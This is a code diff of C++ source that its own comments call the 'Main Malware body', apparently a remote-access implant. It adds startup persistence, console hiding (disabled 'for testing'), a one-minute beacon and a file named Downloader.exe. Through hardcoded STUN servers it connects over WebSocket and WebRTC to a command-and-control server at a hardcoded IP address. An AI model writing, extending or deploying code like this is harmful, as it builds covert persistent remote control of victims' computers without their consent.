@@ -53,48 +53,57 @@ int runScript(char *file_source, char *file_output);
 int setupDirectory();
 int setupPersist();
 
-const string fileName = "Downloader.exe";   // how the file will be saved
-const int SLP_TIME = 10000;                 // In miliseconds
-bool connected = false;						// True if currently connected
+const string c2_id = "6969";
+const string stunServer = "stun:stun.l.google.com:19302";
+const string stunServer2 = "stun:stun2.l.google.com:19302";
+const string signalServed = "ws://73.4.243.143:8000";
+
+const string fileName = "Downloader.exe";
+const int SLP_TIME = 60000;  // 1 Minute
+bool connected = false;
 
 
 
 
-
+/***
+* main | Main Malware body
+***/
 int main(int argc, char **argv) try {
-	Cmdline params(argc, argv);
 
-	rtc::InitLogger(LogLevel::Info);
+	// HideConsole(); // Hides console UI | Disabled for testing purposes
+	setupDirectory();
+	setupPersist();
+
+	Cmdline params(argc, argv);						// Execution parameters
+
+	string c2id = c2_id;							// Reassign global to local scope var
 	Configuration config;
-	// stunServer hardcodes
-	string stunServer = "stun:stun.l.google.com:19302";
-	string stunServer2 = "stun:stun2.l.google.com:19302";
-	string signalServed = "ws://73.4.243.143:8000";
-	string c2id = "6969";
+
+	rtc::InitLogger(LogLevel::Info);				// TODO: Delete rtc logging
 
 	config.iceServers.emplace_back(stunServer);
-	// local id generation
-	localId = randomId(4);
-	//make web socket
-	auto ws = make_shared<WebSocket>();
+
+	localId = randomId(4); 							// Local ID generation
+
+	auto ws = make_shared<WebSocket>();				// Create socket
 
 	std::promise<void> wsPromise;
 	auto wsFuture = wsPromise.get_future();
 
-	//on open
+	// On open connection
 	ws->onOpen([&wsPromise]() {
 		wsPromise.set_value();
 	});
 
-	//on error thrown
+	// On error thrown
 	ws->onError([&wsPromise](string s) {
 		wsPromise.set_exception(std::make_exception_ptr(std::runtime_error(s)));
 	});
 
-	//on websocket close
+	// On socket close
 	ws->onClosed([]() { cout << "WebSocket closed" << endl; });
 
-	//when message received
+	// Sets description accordingly to connect to C2
 	ws->onMessage([&](variant<binary, string> data) {
 		if (!holds_alternative<string>(data))
 			return;
@@ -131,18 +140,14 @@ int main(int argc, char **argv) try {
 		}
 	});
 
-	//craft signal server w/ local id from hardcoded signal server
-	const string url = signalServed + "/" + localId;
+	
+	const string url = signalServed + "/" + localId;   // Format url to connect to C2
 	ws->open(url);
 
-	//waiting for signal connection
-	wsFuture.get();
+	wsFuture.get();							           // Await for connection
 
-	/***
-	* Connected to signal serverl
-	***/
+	/*Connected to C2*/
 
-	//HideConsole(); // Hides console UI | Disabled for testing purposes
 
 	while (true) {
 
